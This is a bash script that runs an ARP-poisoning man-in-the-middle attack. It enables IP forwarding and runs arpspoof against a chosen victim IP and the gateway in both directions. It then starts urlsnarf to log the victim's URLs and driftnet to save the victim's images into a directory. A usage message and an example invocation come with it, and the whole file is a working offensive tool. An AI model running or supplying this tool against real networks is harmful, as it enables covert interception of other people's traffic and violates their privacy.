#!/bin/bash
# arp poisoning


start_client_spoof()
{
    echo "[*] Enabling IP Forwarding"
    echo "[*] Spoofing Client: ${vic}"
    echo "1" > /proc/sys/net/ipv4/ip_forward
    echo -e "[*] Command to execute: arpspoof -i ${nic} -t ${vic} ${gw}"
    gnome-terminal --execute arpspoof -i "${nic}" -t "${vic}" "${gw}" 2>/dev/null
}


start_gateway_spoof()
{
    echo "[*] Spoofing Gateway: ${gw}"
    echo -e "[*] Command to execute: arpspoof -i ${nic} -t ${gw} ${vic}"
    gnome-terminal --execute arpspoof -i "${nic}" -t "${gw}" "${vic}" 2>/dev/null
}


start_urlsnarf()
{
    echo "[*] Starting urlsnarf"
    echo -e "[*] Command to execute: urlsnarf -i ${nic}"
    gnome-terminal --execute urlsnarf -i "${nic}" 2>/dev/null
}

start_drifnet()
{
    echo "[*] Starting driftnet"
    echo -e "[*] Command to execute: driftnet -d ${dir} -i ${nic} -v"
    gnome-terminal --execute driftnet -d ${dir} -i ${nic} -v 2>/dev/null
}


usage()
{
    echo "This script starts the arp poisoning process on a network and outputs images using driftnet to a directory."
    echo ""
    echo "usage: arp_poison.sh -n <network interface> -v <victims IP> -g <network gateway> -d <drifnet tmp dir>"
    echo ""
    echo "EXAMPLE: ./arp_poison.sh -n wlan0 -v 192.168.1.2 -g 192.168.2.254 -d /home/Desktop/tmp_images"
}

    
##### Main

while getopts ":n:v:g:d:h" o; do
    case "${o}" in
        n)
            nic=${OPTARG}
            ;;
        v)
            vic=${OPTARG}
            ;;
        g)
            gw=${OPTARG}
            ;;
        d)
            dir=${OPTARG}
            ;;
        h)
            usage
            exit 1
            ;;
        *)
            echo "INVALID OPTION!"
            ;;
    esac
done
shift $((OPTIND-1))

if [ -z "${nic}" ] || [ -z "${vic}" ] || [ -z "${gw}" ] || [ -z "${dir}" ]; then
    echo "Check usage with -h"
    exit 1
fi

start_client_spoof
start_gateway_spoof
start_urlsnarf
start_drifnet

echo -e "\nENSURE YOU PRESS CTRL + C IN EACH COMMAND WINDOW TO CLOSE!\nTHIS ENSURES THE CLIENT IS CORRECTLY RE-ARPED!"
